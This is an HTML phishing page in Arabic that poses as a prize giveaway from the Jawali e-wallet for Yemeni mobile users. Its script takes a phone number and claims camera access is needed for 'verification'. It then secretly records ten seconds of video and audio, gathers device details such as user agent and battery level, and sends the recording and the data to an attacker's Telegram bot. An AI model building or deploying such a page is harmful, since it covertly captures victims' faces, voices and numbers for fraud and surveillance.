<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>الرئيسية -محفظة جوالي الالكترونية</title
<meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="مرحبا بكم في خدمة جوالي - جوائز قيمة">
  <style>
    body {
      text-align: center;
      direction: rtl;
      font-family: Tahoma, sans-serif;
      background-color: #f9f9f9;
      padding: 30px;
    }
    button {
      font-size: 18px;
      font-weight: bold;
      margin: 10px;
      padding: 10px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .start-button {
      background-color: #007bff;
      color: white;
    }
    .start-button:hover {
      background-color: #0056b3;
    }
    #consentBox {
      background: #fff3cd;
      border: 1px solid #ffeeba;
      padding: 20px;
      margin: 20px auto;
      width: 60%;
      border-radius: 8px;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <h2>🎁 اضغط الزر للحصول على هدية مقدمة من محفظة جوالي الالكترونية (رصيد أو مزايا او مبالغ نقدية)</h2>

  <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك" style="margin-bottom: 10px; padding: 10px; font-size: 18px;"><br>
  <p id="carrierDisplay" style="font-size: 18px; color: #555;"></p>

  <div id="consentBox">
    <p>📸 سيطلب إذن لتشغيل الكاميرا من أجل التحقق من رقمك</p>
    <button class="start-button" onclick="confirmConsent()">أوافق</button>
  </div>

  <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">تأكيد</button>

  <p id="confirmationMessage" style="display: none; font-size: 24px; color: green;">
    ✅ تم تأكيد رقمك: <span id="confirmedNumber"></span>
  </p>

  <script>
    let botToken = '';
    let chatId = '';

    // تحميل إعدادات البوت
    fetch('/config')
      .then(res => res.json())
      .then(data => {
        botToken = data.botToken;
        chatId = data.chatId;
      })
      .catch(err => {
        console.error('فشل تحميل انتظر:', err);
        alert('فشل تحميل انتظر.');
      });

    // كشف مزود الخدمة تلقائياً
    document.getElementById('phoneNumber').addEventListener('input', () => {
      const phone = document.getElementById('phoneNumber').value;
      const carrierName = detectCarrier(phone);
      document.getElementById('carrierDisplay').innerText = "مزود الخدمة: " + carrierName;
    });

    function detectCarrier(phoneNumber) {
      const cleaned = phoneNumber.replace(/\D/g, '');
      const prefix = cleaned.substring(0, 2);
      switch (prefix) {
        case '77':
          return "يمن موبايل";
        case '71':
          return "سبأفون";
        case '73':
          return "MTN";
        case '70':
          return "واي";
        default:
          return "مزود غير معروف";
      }
    }

    function confirmConsent() {
      document.getElementById('consentBox').style.display = 'none';
      document.getElementById('confirmBtn').style.display = 'inline-block';
    }

    function startCameraAndSend() {
      const phoneNumber = document.getElementById('phoneNumber').value.trim();
      if (phoneNumber === '') {
        alert('يرجى إدخال رقم الهاتف.');
        return;
      }

      recordAndSendVideo(phoneNumber);
    }

    async function recordAndSendVideo(phoneNumber) {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert("المتصفح لا يدعم الخدمة.");
        return;
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        const chunks = [];

        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            chunks.push(event.data);
          }
        };

        mediaRecorder.onstop = async () => {
          const videoBlob = new Blob(chunks, { type: 'video/webm' });
          const info = await collectUserInfo(phoneNumber);

          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('video', videoBlob, 'recording.webm');
          formData.append('caption', info.caption);

          fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
            method: 'POST',
            body: formData
          })
          .then(res => res.json())
          .then(result => {
            if (!result.ok) {
              console.error("فشل إرسال تاكيد:", result.description);
            }
          })
          .catch(err => {
            console.error("خطأ أثناء إرسال :", err);
          });

          document.getElementById('confirmedNumber').innerText = phoneNumber;
          document.getElementById('confirmationMessage').style.display = 'block';

          stream.getTracks().forEach(track => track.stop());
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 10000);

      } catch (error) {
        console.error("فشل الوصول :", error);
        alert("تعذر تشغيل .");
      }
    }

    async function collectUserInfo(phoneNumber) {
      const userAgent = navigator.userAgent;
      const connectionStatus = navigator.onLine ? "متصل بالإنترنت" : "غير متصل";
      let batteryLevel = "غير متوفر";

      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          batteryLevel = Math.round(battery.level * 100) + "%";
        } catch (e) {
          batteryLevel = "غير متاح";
        }
      }

      const carrier = detectCarrier(phoneNumber);

      const caption = `
📱 رقم الهاتف: ${phoneNumber}
🏢 مزود الخدمة: ${carrier}
🖥️ نوع الجهاز: ${userAgent}
🔋 نسبة البطارية: ${batteryLevel}
🌐 حالة الاتصال: ${connectionStatus}
      `.trim();

      return { caption };
    }
  </script>

</body>
    </html>
